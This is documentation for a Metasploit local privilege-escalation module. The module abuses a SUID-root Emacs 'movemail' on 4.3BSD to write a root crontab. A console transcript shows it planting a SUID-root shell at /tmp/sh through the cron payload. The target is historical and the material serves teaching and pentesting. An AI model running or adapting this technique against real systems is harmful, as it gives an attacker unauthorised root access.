## Vulnerable Application

### Description

This module exploits a SUID installation of the Emacs `movemail` utility
to run a command as root by writing to 4.3BSD's `/usr/lib/crontab.local`.

The vulnerability is documented in Cliff Stoll's book *The Cuckoo's Egg*.

### Setup

A Docker environment for 4.3BSD on VAX is available at
<https://github.com/wvu/ye-olde-bsd>.

For manual setup, please follow the Computer History Wiki's
[guide](http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH) or Allen
Garvin's [guide](http://plover.net/~agarvin/4.3bsd-on-simh.html) if
you're using [Quasijarus](http://gunkies.org/wiki/4.3_BSD_Quasijarus).

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This uses `/usr/lib/crontab.local` to execute code.

## Options

### MOVEMAIL

Set this to the absolute path to the SUID-root `movemail` executable.

### CMD

If your payload is `cmd/unix/generic` (suggested default), set this to
the command you want to run as root. The provided default will create a
SUID-root shell at `/tmp/sh`.

## Scenarios

### 4.3BSD

```
msf5 > use exploit/unix/local/emacs_movemail
msf5 exploit(unix/local/emacs_movemail) > options

Module options (exploit/unix/local/emacs_movemail):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   MOVEMAIL  /etc/movemail    yes       Path to movemail
   SESSION                    yes       The session to run this module on.


Payload options (cmd/unix/generic):

   Name  Current Setting                       Required  Description
   ----  ---------------                       --------  -----------
   CMD   cp /bin/sh /tmp && chmod u+s /tmp/sh  yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   /usr/lib/crontab.local


msf5 exploit(unix/local/emacs_movemail) > set session -1
session => -1
msf5 exploit(unix/local/emacs_movemail) > run

[*] Setting a sane $PATH: /bin:/usr/bin:/usr/ucb:/etc
[-] Current shell is unknown
[*] $PATH is /bin:/usr/bin:/usr/ucb:/etc
[+] SUID-root /etc/movemail found
[*] Preparing crontab with payload
* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh
* * * * * root rm -f /usr/lib/crontab.local
[*] Creating writable /usr/lib/crontab.local
[+] Writing crontab to /usr/lib/crontab.local
[!] Please wait at least one minute for effect
[*] Exploit completed, but no session was created.
msf5 exploit(unix/local/emacs_movemail) >
```
